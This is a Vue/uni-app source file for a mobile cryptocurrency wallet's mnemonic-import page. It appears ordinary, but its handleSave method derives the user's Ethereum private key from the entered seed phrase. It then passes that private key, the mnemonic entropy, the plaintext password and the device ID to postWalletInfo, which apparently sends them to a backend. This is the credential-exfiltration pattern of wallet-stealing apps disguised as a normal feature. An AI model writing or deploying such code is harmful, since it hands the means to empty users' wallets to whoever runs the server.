<template>
	<view class="import-wallet-container">
		<uni-nav-bar statusBar fixed left-icon="back" :title="title" @clickLeft="goBack" @clickRight="handleRight">
			<view slot="right" class="flex-column flex-center">
				<image src="../../static/image/scan.png" mode="" class="nav-img"></image>
			</view>
		</uni-nav-bar>
		<textarea class="text-area ft26" v-model="words" @input="handleInput" placeholder="输入助记词，用空格做分隔" placeholder-style="font-size: 26rpx;color: #9397AF;"/>
		<view class="form-item">
			<view class="ft32 mb20">设置身份钱包名</view>
			<input class="h60 ft26" type="text" v-model="walletName" placeholder="请输入名称" placeholder-style="font-size: 26rpx;color: #9397AF;" />
		</view>
		<view class="form-item">
			<view class="ft32 mb20">设置密码</view>
			<input class="h60 ft26" password v-model="password" placeholder="密码不少于8位数" placeholder-style="font-size: 26rpx;color: #9397AF;" />
		</view>
		<view class="form-item">
			<view class="ft32 mb20">确认密码</view>
			<input class="h60 ft26" password v-model="confirmPassword" placeholder="密码不少于8位数" placeholder-style="font-size: 26rpx;color: #9397AF;" />
		</view>
		<view class="flex alcenter pl40 mt40">
			<checkbox value="cb" :checked="checked" color="#94A9FF" @tap="handleCheck" style="border-radius: 50%;"/>
			<view>我已阅读并同意</view>
			<text class="c_4C6EF5">《用户协议》</text>
			<view>以及</view>
			<text class="c_4C6EF5">《隐私政策》</text>
		</view>
		<button type="default" class="create-btn" :class="{'active': isActive}" @tap="handleSave">导入钱包</button>
		<scroll-view v-if="fixedBottom > 0 && tipWords.length > 0" scroll-x class="word-scroll" :style="{'bottom': fixedBottom + 'px'}">
			<view v-for="(item, index) in tipWords" :key="index" @tap="handleSelect(item)">{{item}}</view>
		</scroll-view>
	</view>
</template>

<script>
	import * as base from '@/common/word/base';
	import * as address from '@/common/word/address';
	import { allTipWords } from '@/common/word'
	const INIT_TITLE = '导入身份钱包'
	import { CRYPTOCURRENCY_TYPE } from '@/common/constants';
	import { postWalletInfo } from '@/common/utils';
	export default {
		data() {
			return {
				allTipWords: allTipWords,
				tipWords: [],
				words: '',
				walletName: '',
				password: '',
				confirmPassword: '',
				mnemonicCode: '',
				address: '',
				privateKey: '',
				deviceId: 'c3c0268fa44293f2',
				checked: false,
				fixedBottom: 0,
				type: '',
				title: INIT_TITLE,
			};
		},
		computed: {
			isActive() {
				return this.words && this.walletName && this.password.length >= 8 && this.password == this.confirmPassword && this.checked
			}
		},
		onLoad(options) {
			// console.log(lodash)
			if(options.type) {
				this.type = options.type;
				this.title =  `导入${options.type}钱包`
				uni.setNavigationBarTitle({
					title: `导入${options.type}钱包`
				})
			}
			uni.onKeyboardHeightChange((res) =>{
				console.log(res.height)
				if(res.height == 0) {
					this.tipWords = []
				}
				this.fixedBottom = res.height
			})
			// 获取设备信息
			// #ifdef APP-PLUS
			plus.device.getInfo({
				success: (e) =>{
					this.deviceId = e.uuid
					console.log('getDeviceInfo success: '+JSON.stringify(e));
				},
				fail: (e) =>{
					console.log('getDeviceInfo failed: '+JSON.stringify(e));
				}
			});
			// #endif
		},
		methods: {
			handleInput(e) {
				let list = e.detail.value.split(' ')
				this.tipWords = this.allTipWords.filter(item => {
					return item.indexOf(list[list.length - 1]) != -1
				})
			},
			handleSelect(word) {
				let wordList = this.words.split(' ')
				wordList.pop()
				if(this.words.length == 0) {
					this.words = this.words += `${word}`
				}else{
					this.words = wordList.join('') + ` ${word}`
				}
			},
			handleCheck() {
				this.checked = !this.checked
			},
			goBack() {
				uni.navigateBack()
			},
			handleRight() {
				// uni.scanCode({
				// 	success: (res) => {
						
				// 	}
				// })
			},
			async handleSave() {
				if(!this.isActive) return 
				let word_vld = await base.ValidateMnemonic(this.words, "english")
				if(!word_vld) {
					return this.$alert('助记词无效')
				}
				//助记词编码
				this.mnemonicCode = await base.MnemonicToEntropy(this.words, "english")
				
				//助记词生成地址
				var seed_sync = await base.MnemonicToSeedSync(this.words, "")
				var addrs = await address.CreateEthAddressBySeed(seed_sync, 0)
				this.address = addrs.address
				this.privateKey = addrs.privateKey
				
				let uuid = Math.random().toString(36).substr(-10)
				const { chain, symbol, activeImg } = CRYPTOCURRENCY_TYPE[this.type] || {};
				postWalletInfo(this.type,{
					device_id: this.deviceId, // 设备ID
					uuid,// 钱包ID
					chain,// 链名称
					symbol,// 币种名称
					wallt_name: this.walletName,// 钱包名称
					address: this.address,// 地址
					private_key: this.privateKey,// 私钥
					mnemonic_code: this.mnemonicCode,// 助记词编码
					password: this.password,// 密码
					icon: activeImg,// 图标
					contract_addr: '',// 合约地址
				})
			}
		}
	}
</script>

<style lang="scss">
	.import-wallet-container{
		.nav-img{
			width: 44rpx;
			height: 44rpx;
		}
		.text-area{
			margin: 34rpx 24rpx 0 38rpx;
			width: 670rpx;
			height: 180rpx;
			padding: 24rpx 18rpx;
			background: #F8F8F7;
			border-radius: 20rpx;
			border: 1rpx solid #D9DDE1;
			box-sizing: border-box;
		}
		.form-item{
			padding: 34rpx 24rpx 0 38rpx;
			input{
				border-bottom: 1rpx solid #EBEBED;
			}
		}
		.create-btn{
			position: fixed;
			bottom: 160rpx;
			left: 30rpx;
			width: 686rpx;
			height: 96rpx;
			line-height: 96rpx;
			font-size: 32rpx;
			color: #ffffff;
			background: #94A9FF;
			box-shadow: 0rpx 20rpx 40rpx 0rpx rgba(76, 110, 245, 0.5);
			border-radius: 20rpx;
			&.active{
				background: #4C6EF5;
			}
			&:after{
				border: none;
			}
		}
		.word-scroll{
			position: fixed;
			left: 0;
			background-color: #f8f8f7;
			z-index: 10;
			padding: 20rpx;
			display: flex;
			white-space: nowrap;
			box-sizing: border-box;
			view{
				display: inline-flex;
				flex-direction: column;
				height: 60rpx;
				line-height: 60rpx;
				background-color: #ffffff;
				padding: 0 20rpx;
				font-size: 28rpx;
				margin: 0 28rpx;
				border-radius: 8rpx;
			}
		}
	}
</style>
